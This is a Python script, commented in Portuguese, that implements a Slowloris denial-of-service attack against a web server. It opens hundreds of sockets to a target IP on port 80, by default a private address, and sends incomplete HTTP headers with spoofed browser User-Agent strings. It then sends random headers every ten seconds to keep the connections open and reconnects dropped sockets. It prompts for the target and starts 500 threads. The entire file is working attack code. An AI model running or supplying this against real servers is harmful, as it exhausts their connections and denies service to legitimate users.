import socket
import random
import time
from threading import Thread

dst_IP = "172.21.209.231"
PORT = 80
num_sockets = 200

socket_list = []

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
]


def build_sockets():
    print("Construindo sockets...\n")

    for i in range(num_sockets):

        try:

            print(f"Construindo socket: {i + 1}")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((dst_IP, PORT))

            # Estabelece a conexão HTTP enviando dados de cabeçalho (header)
            # User Agent (navegador), idioma e tipo de conexão (Keep Alive - persistente)
            s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
            s.send("{}\r\n".format("User-Agent: " + random.choice(user_agents)).encode("utf-8"))
            s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
            s.send("{}\r\n".format("Connection: Keep-Alive").encode("utf-8"))

            socket_list.append(s)

        except:
            print(f"Falha de construcao de socket...")
            pass

    print("\nConstrucao de sockets finalizada!\n")


def slowloris_start():
    build_sockets()

    print("Inicializando ataque Slowloris...\n")

    while True:

        for s in socket_list:

            try:

                # Efetua o ataque Slowloris mantendo a conexão ativa e enviando
                # dados aleatorios para o servidor
                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))

            except:

                # Erro de conexão de socket, criando novo socket para continuar o ataque
                print("Erro de coxeção de socket.... Reestabelecendo conexão")
                socket_list.remove(s)

                try:

                    new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    new_s.settimeout(4)
                    new_s.connect((dst_IP, PORT))
                    new_s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
                    new_s.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
                    new_s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
                    new_s.send("{}\r\n".format("Connection: Keep-Alive").encode("utf-8"))

                    socket_list.append(new_s)

                except:
                    pass

        print(f"Pacotes enviados! || Sockets Disponiveis: {len(socket_list)} || Reiniciando ataque...\n")
        time.sleep(10)


if __name__ == "__main__":

    ip = input("Digite o IP destinatario do ataque Slowloris (default: 172.21.209.231): ")
    num = input("Digite a quantidade de sockets (default: 200): ")

    if len(ip) > 1:
        dst_IP = ip

    if len(num) > 1:
        num_sockets = int(num)

    print(f"\n(*) IP destinatario: {dst_IP} || Quantidade de sockets: {num_sockets}\n")

    for i in range(0, 500):
        thread = Thread(target=slowloris_start)
        thread.start()
